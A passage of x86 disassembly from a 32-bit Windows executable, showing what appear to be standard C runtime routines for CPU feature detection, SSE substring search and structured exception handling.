  404228:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40422b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40422e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404234:	c3                   	ret
  404235:	55                   	push   %ebp
  404236:	8b ec                	mov    %esp,%ebp
  404238:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40423c:	56                   	push   %esi
  40423d:	8b f1                	mov    %ecx,%esi
  40423f:	c7 06 ec f2 40 00    	movl   $0x40f2ec,(%esi)
  404245:	74 0a                	je     0x404251
  404247:	6a 0c                	push   $0xc
  404249:	56                   	push   %esi
  40424a:	e8 42 f5 ff ff       	call   0x403791
  40424f:	59                   	pop    %ecx
  404250:	59                   	pop    %ecx
  404251:	8b c6                	mov    %esi,%eax
  404253:	5e                   	pop    %esi
  404254:	5d                   	pop    %ebp
  404255:	c2 04 00             	ret    $0x4
  404258:	55                   	push   %ebp
  404259:	8b ec                	mov    %esp,%ebp
  40425b:	83 25 54 6c 41 00 00 	andl   $0x0,0x416c54
  404262:	83 ec 24             	sub    $0x24,%esp
  404265:	83 0d 10 60 41 00 01 	orl    $0x1,0x416010
  40426c:	6a 0a                	push   $0xa
  40426e:	ff 15 58 f1 40 00    	call   *0x40f158
  404274:	85 c0                	test   %eax,%eax
  404276:	0f 84 ac 01 00 00    	je     0x404428
  40427c:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  404280:	33 c0                	xor    %eax,%eax
  404282:	53                   	push   %ebx
  404283:	56                   	push   %esi
  404284:	57                   	push   %edi
  404285:	33 c9                	xor    %ecx,%ecx
  404287:	8d 7d dc             	lea    -0x24(%ebp),%edi
  40428a:	53                   	push   %ebx
  40428b:	0f a2                	cpuid
  40428d:	8b f3                	mov    %ebx,%esi
  40428f:	5b                   	pop    %ebx
  404290:	90                   	nop
  404291:	89 07                	mov    %eax,(%edi)
  404293:	89 77 04             	mov    %esi,0x4(%edi)
  404296:	89 4f 08             	mov    %ecx,0x8(%edi)
  404299:	33 c9                	xor    %ecx,%ecx
  40429b:	89 57 0c             	mov    %edx,0xc(%edi)
  40429e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4042a1:	8b 7d e0             	mov    -0x20(%ebp),%edi
  4042a4:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4042a7:	81 f7 47 65 6e 75    	xor    $0x756e6547,%edi
  4042ad:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4042b0:	35 69 6e 65 49       	xor    $0x49656e69,%eax
  4042b5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4042b8:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4042bb:	35 6e 74 65 6c       	xor    $0x6c65746e,%eax
  4042c0:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4042c3:	33 c0                	xor    %eax,%eax
  4042c5:	40                   	inc    %eax
  4042c6:	53                   	push   %ebx
  4042c7:	0f a2                	cpuid
  4042c9:	8b f3                	mov    %ebx,%esi
  4042cb:	5b                   	pop    %ebx
  4042cc:	90                   	nop
  4042cd:	8d 5d dc             	lea    -0x24(%ebp),%ebx
  4042d0:	89 03                	mov    %eax,(%ebx)
  4042d2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4042d5:	0b 45 f8             	or     -0x8(%ebp),%eax
  4042d8:	0b c7                	or     %edi,%eax
  4042da:	89 73 04             	mov    %esi,0x4(%ebx)
  4042dd:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4042e0:	89 53 0c             	mov    %edx,0xc(%ebx)
  4042e3:	75 43                	jne    0x404328
  4042e5:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4042e8:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
  4042ed:	3d c0 06 01 00       	cmp    $0x106c0,%eax
  4042f2:	74 23                	je     0x404317
  4042f4:	3d 60 06 02 00       	cmp    $0x20660,%eax
  4042f9:	74 1c                	je     0x404317
  4042fb:	3d 70 06 02 00       	cmp    $0x20670,%eax
  404300:	74 15                	je     0x404317
  404302:	3d 50 06 03 00       	cmp    $0x30650,%eax
  404307:	74 0e                	je     0x404317
  404309:	3d 60 06 03 00       	cmp    $0x30660,%eax
  40430e:	74 07                	je     0x404317
  404310:	3d 70 06 03 00       	cmp    $0x30670,%eax
  404315:	75 11                	jne    0x404328
  404317:	8b 3d 58 6c 41 00    	mov    0x416c58,%edi
  40431d:	83 cf 01             	or     $0x1,%edi
  404320:	89 3d 58 6c 41 00    	mov    %edi,0x416c58
  404326:	eb 06                	jmp    0x40432e
  404328:	8b 3d 58 6c 41 00    	mov    0x416c58,%edi
  40432e:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  404331:	6a 07                	push   $0x7
  404333:	58                   	pop    %eax
  404334:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  404337:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  40433a:	7c 30                	jl     0x40436c
  40433c:	33 c9                	xor    %ecx,%ecx
  40433e:	53                   	push   %ebx
  40433f:	0f a2                	cpuid
  404341:	8b f3                	mov    %ebx,%esi
  404343:	5b                   	pop    %ebx
  404344:	90                   	nop
  404345:	8d 5d dc             	lea    -0x24(%ebp),%ebx
  404348:	89 03                	mov    %eax,(%ebx)
  40434a:	89 73 04             	mov    %esi,0x4(%ebx)
  40434d:	89 4b 08             	mov    %ecx,0x8(%ebx)
  404350:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404353:	89 53 0c             	mov    %edx,0xc(%ebx)
  404356:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  404359:	f7 c3 00 02 00 00    	test   $0x200,%ebx
  40435f:	74 0e                	je     0x40436f
  404361:	83 cf 02             	or     $0x2,%edi
  404364:	89 3d 58 6c 41 00    	mov    %edi,0x416c58
  40436a:	eb 03                	jmp    0x40436f
  40436c:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  40436f:	a1 10 60 41 00       	mov    0x416010,%eax
  404374:	83 c8 02             	or     $0x2,%eax
  404377:	c7 05 54 6c 41 00 01 	movl   $0x1,0x416c54
  40437e:	00 00 00 
  404381:	a3 10 60 41 00       	mov    %eax,0x416010
  404386:	f7 c1 00 00 10 00    	test   $0x100000,%ecx
  40438c:	0f 84 93 00 00 00    	je     0x404425
  404392:	83 c8 04             	or     $0x4,%eax
  404395:	c7 05 54 6c 41 00 02 	movl   $0x2,0x416c54
  40439c:	00 00 00 
  40439f:	a3 10 60 41 00       	mov    %eax,0x416010
  4043a4:	f7 c1 00 00 00 08    	test   $0x8000000,%ecx
  4043aa:	74 79                	je     0x404425
  4043ac:	f7 c1 00 00 00 10    	test   $0x10000000,%ecx
  4043b2:	74 71                	je     0x404425
  4043b4:	33 c9                	xor    %ecx,%ecx
  4043b6:	0f 01 d0             	xgetbv
  4043b9:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4043bc:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4043bf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4043c2:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4043c5:	6a 06                	push   $0x6
  4043c7:	5e                   	pop    %esi
  4043c8:	23 c6                	and    %esi,%eax
  4043ca:	3b c6                	cmp    %esi,%eax
  4043cc:	75 57                	jne    0x404425
  4043ce:	a1 10 60 41 00       	mov    0x416010,%eax
  4043d3:	83 c8 08             	or     $0x8,%eax
  4043d6:	c7 05 54 6c 41 00 03 	movl   $0x3,0x416c54
  4043dd:	00 00 00 
  4043e0:	a3 10 60 41 00       	mov    %eax,0x416010
  4043e5:	f6 c3 20             	test   $0x20,%bl
  4043e8:	74 3b                	je     0x404425
  4043ea:	83 c8 20             	or     $0x20,%eax
  4043ed:	c7 05 54 6c 41 00 05 	movl   $0x5,0x416c54
  4043f4:	00 00 00 
  4043f7:	a3 10 60 41 00       	mov    %eax,0x416010
  4043fc:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
  404401:	23 d8                	and    %eax,%ebx
  404403:	3b d8                	cmp    %eax,%ebx
  404405:	75 1e                	jne    0x404425
  404407:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40440a:	ba e0 00 00 00       	mov    $0xe0,%edx
  40440f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404412:	23 c2                	and    %edx,%eax
  404414:	3b c2                	cmp    %edx,%eax
  404416:	75 0d                	jne    0x404425
  404418:	83 0d 10 60 41 00 40 	orl    $0x40,0x416010
  40441f:	89 35 54 6c 41 00    	mov    %esi,0x416c54
  404425:	5f                   	pop    %edi
  404426:	5e                   	pop    %esi
  404427:	5b                   	pop    %ebx
  404428:	33 c0                	xor    %eax,%eax
  40442a:	c9                   	leave
  40442b:	c3                   	ret
  40442c:	33 c0                	xor    %eax,%eax
  40442e:	39 05 1c 73 41 00    	cmp    %eax,0x41731c
  404434:	0f 95 c0             	setne  %al
  404437:	c3                   	ret
  404438:	cc                   	int3
  404439:	cc                   	int3
  40443a:	cc                   	int3
  40443b:	cc                   	int3
  40443c:	cc                   	int3
  40443d:	cc                   	int3
  40443e:	cc                   	int3
  40443f:	cc                   	int3
  404440:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404444:	8b 44 24 04          	mov    0x4(%esp),%eax
  404448:	57                   	push   %edi
  404449:	53                   	push   %ebx
  40444a:	56                   	push   %esi
  40444b:	83 3d 54 6c 41 00 01 	cmpl   $0x1,0x416c54
  404452:	0f 82 d2 01 00 00    	jb     0x40462a
  404458:	0f 87 01 01 00 00    	ja     0x40455f
  40445e:	0f b6 11             	movzbl (%ecx),%edx
  404461:	8b da                	mov    %edx,%ebx
  404463:	c1 e2 08             	shl    $0x8,%edx
  404466:	0b d3                	or     %ebx,%edx
  404468:	0f 84 ed 00 00 00    	je     0x40455b
  40446e:	66 0f 6e da          	movd   %edx,%xmm3
  404472:	f2 0f 70 db 00       	pshuflw $0x0,%xmm3,%xmm3
  404477:	0f 16 db             	movlhps %xmm3,%xmm3
  40447a:	66 0f ef c0          	pxor   %xmm0,%xmm0
  40447e:	8b f1                	mov    %ecx,%esi
  404480:	83 cf ff             	or     $0xffffffff,%edi
  404483:	0f b6 19             	movzbl (%ecx),%ebx
  404486:	83 c1 01             	add    $0x1,%ecx
  404489:	85 db                	test   %ebx,%ebx
  40448b:	74 1d                	je     0x4044aa
  40448d:	f7 c1 0f 00 00 00    	test   $0xf,%ecx
  404493:	75 ee                	jne    0x404483
  404495:	66 0f 6f 11          	movdqa (%ecx),%xmm2
  404499:	66 0f 74 d0          	pcmpeqb %xmm0,%xmm2
  40449d:	66 0f d7 da          	pmovmskb %xmm2,%ebx
  4044a1:	85 db                	test   %ebx,%ebx
  4044a3:	75 05                	jne    0x4044aa
  4044a5:	bf 0f 00 00 00       	mov    $0xf,%edi
  4044aa:	66 0f 7e da          	movd   %xmm3,%edx
  4044ae:	bb ff 0f 00 00       	mov    $0xfff,%ebx
  4044b3:	23 d8                	and    %eax,%ebx
  4044b5:	81 fb f0 0f 00 00    	cmp    $0xff0,%ebx
  4044bb:	77 27                	ja     0x4044e4
  4044bd:	f3 0f 6f 08          	movdqu (%eax),%xmm1
  4044c1:	66 0f ef d2          	pxor   %xmm2,%xmm2
  4044c5:	66 0f 74 d1          	pcmpeqb %xmm1,%xmm2
  4044c9:	66 0f 74 cb          	pcmpeqb %xmm3,%xmm1
  4044cd:	66 0f eb ca          	por    %xmm2,%xmm1
  4044d1:	66 0f d7 d9          	pmovmskb %xmm1,%ebx
  4044d5:	83 c0 10             	add    $0x10,%eax
  4044d8:	85 db                	test   %ebx,%ebx
  4044da:	74 d2                	je     0x4044ae
  4044dc:	0f bc db             	bsf    %ebx,%ebx
  4044df:	83 e8 10             	sub    $0x10,%eax
  4044e2:	03 c3                	add    %ebx,%eax
  4044e4:	0f b6 18             	movzbl (%eax),%ebx
  4044e7:	85 db                	test   %ebx,%ebx
  4044e9:	0f 84 6a 00 00 00    	je     0x404559
  4044ef:	83 c0 01             	add    $0x1,%eax
  4044f2:	3a d3                	cmp    %bl,%dl
  4044f4:	75 b8                	jne    0x4044ae
  4044f6:	8b d0                	mov    %eax,%edx
  4044f8:	8d 4e 01             	lea    0x1(%esi),%ecx
  4044fb:	bb ff 0f 00 00       	mov    $0xfff,%ebx
  404500:	85 cf                	test   %ecx,%edi
  404502:	75 39                	jne    0x40453d
  404504:	23 da                	and    %edx,%ebx
  404506:	81 fb f0 0f 00 00    	cmp    $0xff0,%ebx
  40450c:	77 2f                	ja     0x40453d
  40450e:	f3 0f 6f 0a          	movdqu (%edx),%xmm1
  404512:	66 0f 6f 11          	movdqa (%ecx),%xmm2
  404516:	66 0f 74 ca          	pcmpeqb %xmm2,%xmm1
  40451a:	66 0f 74 d0          	pcmpeqb %xmm0,%xmm2
  40451e:	66 0f 74 c8          	pcmpeqb %xmm0,%xmm1
  404522:	66 0f eb d1          	por    %xmm1,%xmm2
  404526:	66 0f d7 da          	pmovmskb %xmm2,%ebx
  40452a:	85 db                	test   %ebx,%ebx
  40452c:	75 08                	jne    0x404536
  40452e:	83 c2 10             	add    $0x10,%edx
  404531:	83 c1 10             	add    $0x10,%ecx
  404534:	eb c5                	jmp    0x4044fb
  404536:	0f bc db             	bsf    %ebx,%ebx
  404539:	03 d3                	add    %ebx,%edx
  40453b:	03 cb                	add    %ebx,%ecx
  40453d:	0f b6 19             	movzbl (%ecx),%ebx
  404540:	85 db                	test   %ebx,%ebx
  404542:	74 10                	je     0x404554
  404544:	3a 1a                	cmp    (%edx),%bl
  404546:	0f 85 5e ff ff ff    	jne    0x4044aa
  40454c:	83 c2 01             	add    $0x1,%edx
  40454f:	83 c1 01             	add    $0x1,%ecx
  404552:	eb a7                	jmp    0x4044fb
  404554:	48                   	dec    %eax
  404555:	5e                   	pop    %esi
  404556:	5b                   	pop    %ebx
  404557:	5f                   	pop    %edi
  404558:	c3                   	ret
  404559:	33 c0                	xor    %eax,%eax
  40455b:	5e                   	pop    %esi
  40455c:	5b                   	pop    %ebx
  40455d:	5f                   	pop    %edi
  40455e:	c3                   	ret
  40455f:	80 39 00             	cmpb   $0x0,(%ecx)
  404562:	74 f7                	je     0x40455b
  404564:	8b f9                	mov    %ecx,%edi
  404566:	bb ff 0f 00 00       	mov    $0xfff,%ebx
  40456b:	23 d9                	and    %ecx,%ebx
  40456d:	81 fb f0 0f 00 00    	cmp    $0xff0,%ebx
  404573:	77 06                	ja     0x40457b
  404575:	f3 0f 6f 01          	movdqu (%ecx),%xmm0
  404579:	eb 22                	jmp    0x40459d
  40457b:	bb 0f 00 00 00       	mov    $0xf,%ebx
  404580:	0f b6 31             	movzbl (%ecx),%esi
  404583:	83 c1 01             	add    $0x1,%ecx
  404586:	66 0f 3a 20 c6 0f    	pinsrb $0xf,%esi,%xmm0
  40458c:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
  404591:	4b                   	dec    %ebx
  404592:	74 09                	je     0x40459d
  404594:	85 f6                	test   %esi,%esi
  404596:	74 ee                	je     0x404586
  404598:	eb e6                	jmp    0x404580
  40459a:	83 c0 01             	add    $0x1,%eax
  40459d:	66 0f 7e c2          	movd   %xmm0,%edx
  4045a1:	bb ff 0f 00 00       	mov    $0xfff,%ebx
  4045a6:	23 d8                	and    %eax,%ebx
  4045a8:	81 fb f0 0f 00 00    	cmp    $0xff0,%ebx
  4045ae:	76 10                	jbe    0x4045c0
  4045b0:	0f b6 18             	movzbl (%eax),%ebx
  4045b3:	85 db                	test   %ebx,%ebx
  4045b5:	74 a2                	je     0x404559
  4045b7:	3a d3                	cmp    %bl,%dl
  4045b9:	74 18                	je     0x4045d3
  4045bb:	83 c0 01             	add    $0x1,%eax
  4045be:	eb e1                	jmp    0x4045a1
  4045c0:	83 c0 10             	add    $0x10,%eax
  4045c3:	66 0f 3a 63 40 f0 0c 	pcmpistri $0xc,-0x10(%eax),%xmm0
  4045ca:	77 d5                	ja     0x4045a1
  4045cc:	73 8b                	jae    0x404559
  4045ce:	83 e8 10             	sub    $0x10,%eax
  4045d1:	03 c1                	add    %ecx,%eax
  4045d3:	8b d7                	mov    %edi,%edx
  4045d5:	8b f0                	mov    %eax,%esi
  4045d7:	bb ff 0f 00 00       	mov    $0xfff,%ebx
  4045dc:	23 de                	and    %esi,%ebx
  4045de:	81 fb f0 0f 00 00    	cmp    $0xff0,%ebx
  4045e4:	77 29                	ja     0x40460f
  4045e6:	bb ff 0f 00 00       	mov    $0xfff,%ebx
  4045eb:	23 da                	and    %edx,%ebx
  4045ed:	81 fb f0 0f 00 00    	cmp    $0xff0,%ebx
  4045f3:	77 1a                	ja     0x40460f
  4045f5:	f3 0f 6f 0a          	movdqu (%edx),%xmm1
  4045f9:	83 c6 10             	add    $0x10,%esi
  4045fc:	83 c2 10             	add    $0x10,%edx
  4045ff:	66 0f 3a 63 4e f0 0c 	pcmpistri $0xc,-0x10(%esi),%xmm1
  404606:	71 92                	jno    0x40459a
  404608:	79 cd                	jns    0x4045d7
  40460a:	e9 4c ff ff ff       	jmp    0x40455b
  40460f:	0f b6 1a             	movzbl (%edx),%ebx
  404612:	85 db                	test   %ebx,%ebx
  404614:	0f 84 41 ff ff ff    	je     0x40455b
  40461a:	3a 1e                	cmp    (%esi),%bl
  40461c:	0f 85 78 ff ff ff    	jne    0x40459a
  404622:	83 c6 01             	add    $0x1,%esi
  404625:	83 c2 01             	add    $0x1,%edx
  404628:	eb ad                	jmp    0x4045d7
  40462a:	8a 11                	mov    (%ecx),%dl
  40462c:	8b f8                	mov    %eax,%edi
  40462e:	84 d2                	test   %dl,%dl
  404630:	0f 84 6f 00 00 00    	je     0x4046a5
  404636:	8a 71 01             	mov    0x1(%ecx),%dh
  404639:	84 f6                	test   %dh,%dh
  40463b:	74 55                	je     0x404692
  40463d:	8b f7                	mov    %edi,%esi
  40463f:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  404643:	8a 07                	mov    (%edi),%al
  404645:	83 c6 01             	add    $0x1,%esi
  404648:	3a c2                	cmp    %dl,%al
  40464a:	74 17                	je     0x404663
  40464c:	84 c0                	test   %al,%al
  40464e:	74 0d                	je     0x40465d
  404650:	8a 06                	mov    (%esi),%al
  404652:	83 c6 01             	add    $0x1,%esi
  404655:	3a c2                	cmp    %dl,%al
  404657:	74 0a                	je     0x404663
  404659:	84 c0                	test   %al,%al
  40465b:	75 f3                	jne    0x404650
  40465d:	5e                   	pop    %esi
  40465e:	5b                   	pop    %ebx
  40465f:	5f                   	pop    %edi
  404660:	33 c0                	xor    %eax,%eax
  404662:	c3                   	ret
  404663:	8a 06                	mov    (%esi),%al
  404665:	83 c6 01             	add    $0x1,%esi
  404668:	3a c6                	cmp    %dh,%al
  40466a:	75 e9                	jne    0x404655
  40466c:	8d 7e ff             	lea    -0x1(%esi),%edi
  40466f:	8a 61 02             	mov    0x2(%ecx),%ah
  404672:	84 e4                	test   %ah,%ah
  404674:	74 28                	je     0x40469e
  404676:	8a 06                	mov    (%esi),%al
  404678:	83 c6 02             	add    $0x2,%esi
  40467b:	3a c4                	cmp    %ah,%al
  40467d:	75 be                	jne    0x40463d
  40467f:	8a 41 03             	mov    0x3(%ecx),%al
  404682:	84 c0                	test   %al,%al
  404684:	74 18                	je     0x40469e
  404686:	8a 66 ff             	mov    -0x1(%esi),%ah
  404689:	83 c1 02             	add    $0x2,%ecx
  40468c:	3a c4                	cmp    %ah,%al
  40468e:	74 df                	je     0x40466f
  404690:	eb ab                	jmp    0x40463d
  404692:	33 c0                	xor    %eax,%eax
  404694:	5e                   	pop    %esi
  404695:	5b                   	pop    %ebx
  404696:	5f                   	pop    %edi
  404697:	8a c2                	mov    %dl,%al
  404699:	e9 c0 05 00 00       	jmp    0x404c5e
  40469e:	8d 47 ff             	lea    -0x1(%edi),%eax
  4046a1:	5e                   	pop    %esi
  4046a2:	5b                   	pop    %ebx
  4046a3:	5f                   	pop    %edi
  4046a4:	c3                   	ret
  4046a5:	8b c7                	mov    %edi,%eax
  4046a7:	5e                   	pop    %esi
  4046a8:	5b                   	pop    %ebx
  4046a9:	5f                   	pop    %edi
  4046aa:	c3                   	ret
  4046ab:	cc                   	int3
  4046ac:	cc                   	int3
  4046ad:	cc                   	int3
  4046ae:	cc                   	int3
  4046af:	cc                   	int3
  4046b0:	55                   	push   %ebp
  4046b1:	8b ec                	mov    %esp,%ebp
  4046b3:	56                   	push   %esi
  4046b4:	8b 75 08             	mov    0x8(%ebp),%esi
  4046b7:	57                   	push   %edi
  4046b8:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4046bb:	8b 06                	mov    (%esi),%eax
  4046bd:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4046c0:	74 0d                	je     0x4046cf
  4046c2:	8b 4e 04             	mov    0x4(%esi),%ecx
  4046c5:	03 cf                	add    %edi,%ecx
  4046c7:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  4046ca:	e8 76 f0 ff ff       	call   0x403745
  4046cf:	8b 46 08             	mov    0x8(%esi),%eax
  4046d2:	8b 4e 0c             	mov    0xc(%esi),%ecx
  4046d5:	03 cf                	add    %edi,%ecx
  4046d7:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  4046da:	5f                   	pop    %edi
  4046db:	5e                   	pop    %esi
  4046dc:	5d                   	pop    %ebp
  4046dd:	e9 63 f0 ff ff       	jmp    0x403745
  4046e2:	cc                   	int3
  4046e3:	cc                   	int3
  4046e4:	cc                   	int3
  4046e5:	cc                   	int3
  4046e6:	cc                   	int3
  4046e7:	cc                   	int3
  4046e8:	cc                   	int3
  4046e9:	cc                   	int3
  4046ea:	cc                   	int3
  4046eb:	cc                   	int3
  4046ec:	cc                   	int3
  4046ed:	cc                   	int3
  4046ee:	cc                   	int3
  4046ef:	cc                   	int3
  4046f0:	55                   	push   %ebp
  4046f1:	8b ec                	mov    %esp,%ebp
  4046f3:	83 ec 1c             	sub    $0x1c,%esp
  4046f6:	53                   	push   %ebx
  4046f7:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4046fa:	56                   	push   %esi
  4046fb:	57                   	push   %edi
  4046fc:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  404700:	ff 33                	push   (%ebx)
  404702:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  404709:	e8 c2 9d 00 00       	call   0x40e4d0
  40470e:	89 03                	mov    %eax,(%ebx)
  404710:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404713:	8b 43 08             	mov    0x8(%ebx),%eax
  404716:	8d 73 10             	lea    0x10(%ebx),%esi
  404719:	33 05 04 60 41 00    	xor    0x416004,%eax
  40471f:	56                   	push   %esi
  404720:	50                   	push   %eax
  404721:	89 75 f0             	mov    %esi,-0x10(%ebp)
  404724:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404727:	e8 84 ff ff ff       	call   0x4046b0
  40472c:	ff 75 10             	push   0x10(%ebp)
  40472f:	e8 53 07 00 00       	call   0x404e87
  404734:	8b 45 08             	mov    0x8(%ebp),%eax
  404737:	83 c4 10             	add    $0x10,%esp
  40473a:	8b 7b 0c             	mov    0xc(%ebx),%edi
  40473d:	f6 40 04 66          	testb  $0x66,0x4(%eax)
  404741:	75 5a                	jne    0x40479d
  404743:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404746:	8b 45 10             	mov    0x10(%ebp),%eax
  404749:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40474c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40474f:	89 43 fc             	mov    %eax,-0x4(%ebx)
  404752:	83 ff fe             	cmp    $0xfffffffe,%edi
  404755:	74 69                	je     0x4047c0
  404757:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40475a:	8d 47 02             	lea    0x2(%edi),%eax
  40475d:	8d 04 47             	lea    (%edi,%eax,2),%eax
  404760:	8b 1c 81             	mov    (%ecx,%eax,4),%ebx
  404763:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  404766:	8b 48 04             	mov    0x4(%eax),%ecx
  404769:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40476c:	85 c9                	test   %ecx,%ecx
  40476e:	74 14                	je     0x404784
  404770:	8b d6                	mov    %esi,%edx
  404772:	e8 99 06 00 00       	call   0x404e10
  404777:	b1 01                	mov    $0x1,%cl
  404779:	88 4d ff             	mov    %cl,-0x1(%ebp)
  40477c:	85 c0                	test   %eax,%eax
  40477e:	78 14                	js     0x404794
  404780:	7f 48                	jg     0x4047ca
  404782:	eb 03                	jmp    0x404787
  404784:	8a 4d ff             	mov    -0x1(%ebp),%cl
  404787:	8b fb                	mov    %ebx,%edi
  404789:	83 fb fe             	cmp    $0xfffffffe,%ebx
  40478c:	75 c9                	jne    0x404757
  40478e:	84 c9                	test   %cl,%cl
  404790:	74 2e                	je     0x4047c0
  404792:	eb 20                	jmp    0x4047b4
  404794:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40479b:	eb 17                	jmp    0x4047b4
  40479d:	83 ff fe             	cmp    $0xfffffffe,%edi
  4047a0:	74 1e                	je     0x4047c0
  4047a2:	68 04 60 41 00       	push   $0x416004
  4047a7:	56                   	push   %esi
  4047a8:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
  4047ad:	8b cb                	mov    %ebx,%ecx
  4047af:	e8 bc 06 00 00       	call   0x404e70
  4047b4:	56                   	push   %esi
  4047b5:	ff 75 f8             	push   -0x8(%ebp)
  4047b8:	e8 f3 fe ff ff       	call   0x4046b0
  4047bd:	83 c4 08             	add    $0x8,%esp
  4047c0:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4047c3:	5f                   	pop    %edi
  4047c4:	5e                   	pop    %esi
  4047c5:	5b                   	pop    %ebx
  4047c6:	8b e5                	mov    %ebp,%esp
  4047c8:	5d                   	pop    %ebp
  4047c9:	c3                   	ret
  4047ca:	8b 45 08             	mov    0x8(%ebp),%eax
  4047cd:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%eax)
  4047d3:	75 38                	jne    0x40480d
  4047d5:	83 3d f0 f2 40 00 00 	cmpl   $0x0,0x40f2f0
  4047dc:	74 2f                	je     0x40480d
  4047de:	68 f0 f2 40 00       	push   $0x40f2f0
  4047e3:	e8 d8 9a 00 00       	call   0x40e2c0
  4047e8:	83 c4 04             	add    $0x4,%esp
  4047eb:	85 c0                	test   %eax,%eax
  4047ed:	74 1b                	je     0x40480a
  4047ef:	8b 35 f0 f2 40 00    	mov    0x40f2f0,%esi
  4047f5:	8b ce                	mov    %esi,%ecx
  4047f7:	6a 01                	push   $0x1
  4047f9:	ff 75 08             	push   0x8(%ebp)
  4047fc:	ff 15 24 f2 40 00    	call   *0x40f224
  404802:	ff d6                	call   *%esi
  404804:	8b 75 f0             	mov    -0x10(%ebp),%esi
  404807:	83 c4 08             	add    $0x8,%esp
  40480a:	8b 45 08             	mov    0x8(%ebp),%eax
  40480d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404810:	8b d0                	mov    %eax,%edx
  404812:	e8 39 06 00 00       	call   0x404e50
  404817:	8b 45 0c             	mov    0xc(%ebp),%eax
  40481a:	39 78 0c             	cmp    %edi,0xc(%eax)
  40481d:	74 12                	je     0x404831
  40481f:	68 04 60 41 00       	push   $0x416004
  404824:	56                   	push   %esi
  404825:	8b d7                	mov    %edi,%edx
  404827:	8b c8                	mov    %eax,%ecx
  404829:	e8 42 06 00 00       	call   0x404e70
  40482e:	8b 45 0c             	mov    0xc(%ebp),%eax
  404831:	56                   	push   %esi
  404832:	ff 75 f8             	push   -0x8(%ebp)
  404835:	89 58 0c             	mov    %ebx,0xc(%eax)
  404838:	e8 73 fe ff ff       	call   0x4046b0
  40483d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  404840:	83 c4 08             	add    $0x8,%esp
  404843:	8b d6                	mov    %esi,%edx
  404845:	8b 49 08             	mov    0x8(%ecx),%ecx
  404848:	e8 e3 05 00 00       	call   0x404e30
  40484d:	cc                   	int3
  40484e:	55                   	push   %ebp
  40484f:	8b ec                	mov    %esp,%ebp
  404851:	57                   	push   %edi
  404852:	8b 7d 08             	mov    0x8(%ebp),%edi
  404855:	80 7f 04 00          	cmpb   $0x0,0x4(%edi)
  404859:	74 48                	je     0x4048a3
  40485b:	8b 0f                	mov    (%edi),%ecx
  40485d:	85 c9                	test   %ecx,%ecx
  40485f:	74 42                	je     0x4048a3
  404861:	8d 51 01             	lea    0x1(%ecx),%edx
  404864:	8a 01                	mov    (%ecx),%al
  404866:	41                   	inc    %ecx
  404867:	84 c0                	test   %al,%al
  404869:	75 f9                	jne    0x404864
  40486b:	2b ca                	sub    %edx,%ecx
  40486d:	53                   	push   %ebx
  40486e:	56                   	push   %esi
  40486f:	8d 59 01             	lea    0x1(%ecx),%ebx
  404872:	53                   	push   %ebx
  404873:	e8 52 11 00 00       	call   0x4059ca
  404878:	8b f0                	mov    %eax,%esi
  40487a:	59                   	pop    %ecx
  40487b:	85 f6                	test   %esi,%esi
  40487d:	74 19                	je     0x404898
  40487f:	ff 37                	push   (%edi)
  404881:	53                   	push   %ebx
  404882:	56                   	push   %esi
  404883:	e8 db 22 00 00       	call   0x406b63
  404888:	8b 45 0c             	mov    0xc(%ebp),%eax
  40488b:	8b ce                	mov    %esi,%ecx
  40488d:	83 c4 0c             	add    $0xc,%esp
  404890:	33 f6                	xor    %esi,%esi
  404892:	89 08                	mov    %ecx,(%eax)
  404894:	c6 40 04 01          	movb   $0x1,0x4(%eax)
  404898:	56                   	push   %esi
  404899:	e8 7a 1d 00 00       	call   0x406618
  40489e:	59                   	pop    %ecx
  40489f:	5e                   	pop    %esi
  4048a0:	5b                   	pop    %ebx
  4048a1:	eb 0b                	jmp    0x4048ae
